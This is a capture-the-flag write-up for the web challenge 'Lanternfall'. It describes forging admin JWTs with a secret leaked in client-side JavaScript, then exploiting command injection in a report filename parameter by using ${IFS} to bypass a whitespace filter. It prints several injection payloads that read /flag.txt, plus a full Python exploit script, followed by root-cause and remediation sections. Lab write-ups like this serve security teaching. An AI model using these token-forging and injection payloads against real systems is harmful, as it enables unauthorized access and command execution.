# Lanternfall - CTF Writeup

**Challenge**: Lanternfall
**Category**: Web
**Difficulty**: Very Easy
**Points**: 1000 (925 base + solves bonus)
**Flag**: `HTB{4y4m3_g3kk0_m00nl1ght_4ll3ys_sh4d0w_w3b_55b599df8e40e81683ce02e332f88b3e}`

## Summary

Lanternfall was a web challenge involving a Next.js application with SQLite report generation functionality. The vulnerability was **command injection** through the filename parameter in the report generation endpoint. By using shell command substitution with `${IFS}` to bypass whitespace restrictions, we could execute arbitrary commands and read the flag file.

## Reconnaissance

### Initial Exploration

The application presented a "Secret Leak Platform" with various services. Key findings:

1. **JWT Secret Exposed**: Found in client-side JavaScript at `/_next/static/chunks/pages/admin-8fd9c6420ad81ca8.js`
   ```
   ayame_moonlight_gekko_secret_key_for_jwt_signing_do_not_use_in_production_2024
   ```

2. **Admin Endpoints**: Using forged admin JWT tokens, we gained access to:
   - `/api/admin/reports` - Report generation endpoint
   - `/api/admin/files` - File download endpoint
   - `/api/admin/tokens` - Token generation (requires `X-Lantern-Sigil` header)

3. **Report Types**:
   - `user_activity` - Lists all users
   - `login_logs` - Shows login timestamps
   - `db_stats` - Database statistics (had SQL syntax errors)
   - `access_logs` - Access logs (referenced non-existent table)

## Vulnerability Discovery

### Error Message Revelation

Testing the report generation with a null byte in the filename revealed the actual command being executed:

```python
r = requests.post(f"{BASE_URL}/api/admin/reports", json={
    "reportType": "user_activity",
    "format": "txt",
    "filename": "test\x00flag.txt"
})
```

**Error Response**:
```
Failed to generate report: The argument 'args[1]' must be a string without null bytes.
Received 'sqlite3 "prisma/dev.db" ".mode line" ".output /tmp/reports/test\x00flag.txt" "QUERY"'
```

This revealed the backend was executing:
```bash
sqlite3 "prisma/dev.db" ".mode line" ".output /tmp/reports/FILENAME" "QUERY"
```

### Command Injection Vector

The filename parameter was being directly interpolated into a shell command! The application validated against whitespace characters, but we could bypass this using `${IFS}` (Internal Field Separator).

## Exploitation

### Payload Construction

We used command substitution to execute `cat /flag.txt` and redirect the output:

```python
filename = "`cat${IFS}/flag.txt${IFS}>/tmp/reports/THEFLAG.txt`.txt"
```

This exploits the shell's backtick command substitution:
1. The shell evaluates the backtick expression
2. Executes: `cat /flag.txt > /tmp/reports/THEFLAG.txt`
3. The output becomes part of the filename

### Alternative Methods

Multiple techniques worked:

```python
# Method 1: Backtick substitution with redirection
"`cat${IFS}/flag.txt${IFS}>/tmp/reports/THEFLAG.txt`.txt"

# Method 2: $() syntax
"$(cat${IFS}/flag.txt${IFS}>/tmp/reports/THEFLAG2.txt).txt"

# Method 3: Using tee
"`cat${IFS}/flag.txt${IFS}|${IFS}tee${IFS}/tmp/reports/THEFLAG3.txt`.txt"

# Method 4: Flag in filename itself
"`cat${IFS}/flag.txt`.txt"  # Creates file named: HTB{...}.txt
```

### Flag Retrieval

After generating the report with the injected command:

```python
# Download the flag
r = requests.get(f"{BASE_URL}/api/admin/files",
                 params={"filename": "THEFLAG.txt"})
print(r.text)
```

**Output**:
```
HTB{4y4m3_g3kk0_m00nl1ght_4ll3ys_sh4d0w_w3b_55b599df8e40e81683ce02e332f88b3e}
```

## Complete Exploit

```python
#!/usr/bin/env python3
import requests
import jwt
import datetime

BASE_URL = "http://154.57.164.73:32397"
JWT_SECRET = "ayame_moonlight_gekko_secret_key_for_jwt_signing_do_not_use_in_production_2024"

# Create admin token
payload = {
    "sub": "999",
    "username": "exploit",
    "role": "admin",
    "email": "exploit@test.com",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(hours=1)).timestamp()),
    "jti": "exploit-token"
}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")

headers = {
    "Authorization": f"Bearer {admin_token}",
    "Content-Type": "application/json"
}

# Exploit: Inject command to read flag
r = requests.post(f"{BASE_URL}/api/admin/reports", headers=headers, json={
    "reportType": "user_activity",
    "format": "txt",
    "filename": "`cat${IFS}/flag.txt${IFS}>/tmp/reports/FLAG.txt`.txt"
})

print(f"Injection Status: {r.status_code}")

# Download the flag
r = requests.get(f"{BASE_URL}/api/admin/files", headers=headers,
                 params={"filename": "FLAG.txt"})

if r.status_code == 200:
    print(f"FLAG: {r.text}")
```

## Root Cause

The vulnerability occurred because:

1. **Insecure Command Construction**: The backend constructed shell commands using string concatenation with user input
2. **Insufficient Input Validation**: Only whitespace was blocked; shell metacharacters like backticks and `$()` were allowed
3. **No Command Parameterization**: The application should have used safer methods like parameterized queries or proper escaping

## Remediation

1. **Never execute shell commands with user input**: Use libraries that don't invoke shells
2. **Input Validation**: Whitelist only alphanumeric characters and specific safe characters
3. **Use Safe APIs**: Use SQLite libraries directly instead of invoking the CLI
4. **Principle of Least Privilege**: The application shouldn't need shell command execution

## Key Learnings

- **Error messages can reveal implementation details**: The null byte error exposed the full command structure
- **Whitespace filtering alone is insufficient**: `${IFS}` and other techniques can bypass space restrictions
- **Command injection vulnerabilities persist**: Even in modern frameworks, unsafe shell command construction is dangerous
- **Testing edge cases is crucial**: Null bytes, special characters, and unusual inputs often reveal vulnerabilities

## Timeline

- **Sessions 1-4**: Explored SQLite injection, `.output |command` syntax, X-Lantern-Sigil header, path traversal - all dead ends
- **Session 5 - Breakthrough**:
  - Tested null byte in filename parameter
  - Error message revealed shell command structure
  - Identified command injection vector
  - Successfully exploited using `${IFS}` to bypass whitespace filter
  - Retrieved flag via multiple methods

## Conclusion

This "Very Easy" challenge demonstrated that even simple input validation bypasses can lead to complete system compromise. The key was recognizing that the filename parameter was being used in a shell command and finding a way to inject commands despite whitespace restrictions. The `${IFS}` technique proved effective for bypassing space-based filters in shell injection attacks.
